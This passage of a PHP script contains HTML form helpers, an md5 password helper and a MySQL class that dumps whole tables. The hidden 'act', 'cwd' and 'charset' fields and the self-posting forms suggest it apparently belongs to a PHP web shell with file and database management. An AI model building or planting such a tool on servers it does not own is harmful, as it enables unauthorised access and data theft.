    for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 5; $i++) {

        $size /= 1024;

    }

    return round($size, 2).' '.$unit[$i];

}

function p($str){

    echo $str."\n";

}



function makehide($name,$value=''){

    p("&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;");

}



function makeinput($arg = array()){

    $arg['size'] = isset($arg['size']) &amp;&amp; $arg['size'] &gt; 0 ? "size=\"$arg[size]\"" : "size=\"100\"";

    $arg['type'] = isset($arg['type']) ? $arg['type'] : 'text';

    $arg['title'] = isset($arg['title']) ? $arg['title'].'&lt;br /&gt;' : '';

    $arg['class'] = isset($arg['class']) ? $arg['class'] : 'input';

    $arg['name'] = isset($arg['name']) ? $arg['name'] : '';

    $arg['value'] = isset($arg['value']) ? $arg['value'] : '';

    if (isset($arg['newline'])) p('&lt;p&gt;');

    p("$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] /&gt;");

    if (isset($arg['newline'])) p('&lt;/p&gt;');

}



function makeselect($arg = array()){

    $onchange = isset($arg['onchange']) ? 'onchange="'.$arg['onchange'].'"' : '';

    $arg['title'] = isset($arg['title']) ? $arg['title'] : '';

    $arg['name'] = isset($arg['name']) ? $arg['name'] : '';

    p("$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange&gt;");

        if (is_array($arg['option'])) {

            foreach ($arg['option'] as $key=&gt;$value) {

                if ($arg['selected']==$key) {

                    p("&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;");

                } else {

                    p("&lt;option value=\"$key\"&gt;$value&lt;/option&gt;");

                }

            }

        }

    p("&lt;/select&gt;");

}

function formhead($arg = array()) {

    !isset($arg['method']) &amp;&amp; $arg['method'] = 'post';

    !isset($arg['name']) &amp;&amp; $arg['name'] = 'form1';

    $arg['extra'] = isset($arg['extra']) ? $arg['extra'] : '';

    $arg['onsubmit'] = isset($arg['onsubmit']) ? "onsubmit=\"$arg[onsubmit]\"" : '';

    p("&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"".SELF."\" method=\"$arg[method]\" $arg[onsubmit] $arg[extra]&gt;");

    if (isset($arg['title'])) {

        p('&lt;h2&gt;'.$arg['title'].' »&lt;/h2&gt;');

    }

}

    

function maketext($arg = array()){

    $arg['title'] = isset($arg['title']) ? $arg['title'].'&lt;br /&gt;' : '';

    $arg['name'] = isset($arg['name']) ? $arg['name'] : '';

    p("&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"100\" rows=\"25\"&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;");

}



function formfooter($name = ''){

    !$name &amp;&amp; $name = 'submit';

    p('&lt;p&gt;&lt;input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="提交"&gt;&lt;/p&gt;');

    p('&lt;/form&gt;');

}



function goback(){

    global $cwd, $charset;

    p('&lt;form action="'.SELF.'" method="post"&gt;&lt;input type="hidden" name="act" value="file" /&gt;&lt;input type="hidden" name="cwd" value="'.$cwd.'" /&gt;&lt;input type="hidden" name="charset" value="'.$charset.'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="返回"&gt;&lt;/p&gt;&lt;/form&gt;');

}



function formfoot(){

    p('&lt;/form&gt;');

}



function encode_pass($pass) {

    $pass = md5($pass);

    return $pass;

}



function pr($a) {

    p('&lt;div style="text-align: left;border:1px solid #ddd;"&gt;&lt;pre&gt;'.print_r($a).'&lt;/pre&gt;&lt;/div&gt;');

}



class DB_MySQL  {



    var $querycount = 0;

    var $link;

    var $charsetdb = array();

    var $charset = '';



    function connect($dbhost, $dbuser, $dbpass, $dbname='') {

        @ini_set('mysql.connect_timeout', 5);

        if(!$this-&gt;link = @mysql_connect($dbhost, $dbuser, $dbpass, 1)) {

            $this-&gt;halt('Can not connect to MySQL server');

        }

        if($this-&gt;version() &gt; '4.1') {

            $this-&gt;setcharset($this-&gt;charset);

        }

        $dbname &amp;&amp; mysql_select_db($dbname, $this-&gt;link);

    }

    function setcharset($charset) {

        if ($charset &amp;&amp; $this-&gt;charsetdb[$charset]) {

            if(function_exists('mysql_set_charset')) {

                mysql_set_charset($this-&gt;charsetdb[$charset], $this-&gt;link);

            } else {

                $this-&gt;query("SET character_set_connection='".$this-&gt;charsetdb[$charset]."', character_set_results='".$this-&gt;charsetdb[$charset]."', character_set_client=binary");

            }

        }

    }

    function select_db($dbname) {

        return mysql_select_db($dbname, $this-&gt;link);

    }

    function geterrdesc() {

        return (($this-&gt;link) ? mysql_error($this-&gt;link) : mysql_error());

    }

    function geterrno() {

        return intval(($this-&gt;link) ? mysql_errno($this-&gt;link) : mysql_errno());

    }

    function fetch($query, $result_type = MYSQL_ASSOC) { //MYSQL_NUM

        return mysql_fetch_array($query, $result_type);

    }

    function query($sql) {

        //echo '&lt;p style="color:#f00;"&gt;'.$sql.'&lt;/p&gt;';

        if(!($query = mysql_query($sql, $this-&gt;link))) {

            $this-&gt;halt('MySQL Query Error', $sql);

        }

        $this-&gt;querycount++;

        return $query;

    }

    function query_res($sql) { 

        $res = '';

        if(!$res = mysql_query($sql, $this-&gt;link)) { 

            $res = 0;

        } else if(is_resource($res)) {

            $res = 1; 

        } else {

            $res = 2;

        }

        $this-&gt;querycount++;

        return $res;

    }

    function num_rows($query) {

        $query = mysql_num_rows($query);

        return $query;

    }

    function num_fields($query) {

        $query = mysql_num_fields($query);

        return $query;

    }

    function affected_rows() {

        return mysql_affected_rows($this-&gt;link);

    }

    function result($query, $row) {

        $query = mysql_result($query, $row);

        return $query;

    }   

    function free_result($query) {

        $query = mysql_free_result($query);

        return $query;

    }

    function version() {

        return mysql_get_server_info($this-&gt;link);

    }

    function close() {

        return mysql_close($this-&gt;link);

    }

    function halt($msg =''){

        echo "&lt;h2&gt;".htmlspecialchars($msg)."&lt;/h2&gt;\n";

        echo "&lt;p class=\"b\"&gt;Mysql error description: ".htmlspecialchars($this-&gt;geterrdesc())."&lt;/p&gt;\n";

        echo "&lt;p class=\"b\"&gt;Mysql error number: ".$this-&gt;geterrno()."&lt;/p&gt;\n";

        exit;

    }

    function get_fields_meta($result) {

        $fields = array();

        $num_fields = $this-&gt;num_fields($result);

        for ($i = 0; $i &lt; $num_fields; $i++) {

            $field = mysql_fetch_field($result, $i);

            $fields[] = $field;

        }

        return $fields;

    }

    function sqlAddSlashes($s = ''){

        $s = str_replace('\\', '\\\\', $s);

        $s = str_replace('\'', '\'\'', $s);

        return $s;

    }

    // 备份数据库

    function sqldump($table, $fp=0) {

        $crlf = (IS_WIN ? "\r\n" : "\n");

        $search = array("\x00", "\x0a", "\x0d", "\x1a"); //\x08\\x09, not required

        $replace = array('\0', '\n', '\r', '\Z');



        if (isset($this-&gt;charset) &amp;&amp; isset($this-&gt;charsetdb[$this-&gt;charset])) {

            $set_names = $this-&gt;charsetdb[$this-&gt;charset];

        } else {

            $set_names = $this-&gt;charsetdb['utf-8'];

        }

        $tabledump = 'SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";'.$crlf.$crlf;

        $tabledump .= '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;'.$crlf

               . '/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;'.$crlf

               . '/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;'.$crlf

               . '/*!40101 SET NAMES ' . $set_names . ' */;'.$crlf.$crlf;



        $tabledump .= "DROP TABLE IF EXISTS `$table`;".$crlf;

        $res = $this-&gt;query("SHOW CREATE TABLE $table");

        $create = $this-&gt;fetch($res, MYSQL_NUM);

        $tabledump .= $create[1].';'.$crlf.$crlf;

        if (strpos($tabledump, "(\r\n ")) {

            $tabledump = str_replace("\r\n", $crlf, $tabledump);

        } elseif (strpos($tabledump, "(\n ")) {

            $tabledump = str_replace("\n", $crlf, $tabledump);

        } elseif (strpos($tabledump, "(\r ")) {

            $tabledump = str_replace("\r", $crlf, $tabledump);

        }

        unset($create);



        if ($fp) {

            fwrite($fp,$tabledump);

        } else {

            echo $tabledump;

        }

        $tabledump = '';

        $rows = $this-&gt;query("SELECT * FROM $table");

        $fields_cnt = $this-&gt;num_fields($rows);

        $fields_meta = $this-&gt;get_fields_meta($rows);



        while ($row = $this-&gt;fetch($rows, MYSQL_NUM)) {

            for ($j = 0; $j &lt; $fields_cnt; $j++) {

                if (!isset($row[$j]) || is_null($row[$j])) {

                    $values[] = 'NULL';

                } elseif ($fields_meta[$j]-&gt;numeric &amp;&amp; $fields_meta[$j]-&gt;type != 'timestamp' &amp;&amp; !$fields_meta[$j]-&gt;blob) {

                    $values[] = $row[$j];

                } elseif ($fields_meta[$j]-&gt;blob) {

                    if (empty($row[$j]) &amp;&amp; $row[$j] != '0') {

                        $values[] = '\'\'';

                    } else {

                        $values[] = '0x'.bin2hex($row[$j]);

                    }

                } else {

                    $values[] = '\''.str_replace($search, $replace, $this-&gt;sqlAddSlashes($row[$j])).'\'';

                }

            }

            $tabledump = 'INSERT INTO `'.$table.'` VALUES('.implode(', ', $values).');'.$crlf;

            unset($values);

            if ($fp) {

                fwrite($fp,$tabledump);

            } else {

                echo $tabledump;

            }

        }

        $this-&gt;free_result($rows);

    }

}
?>
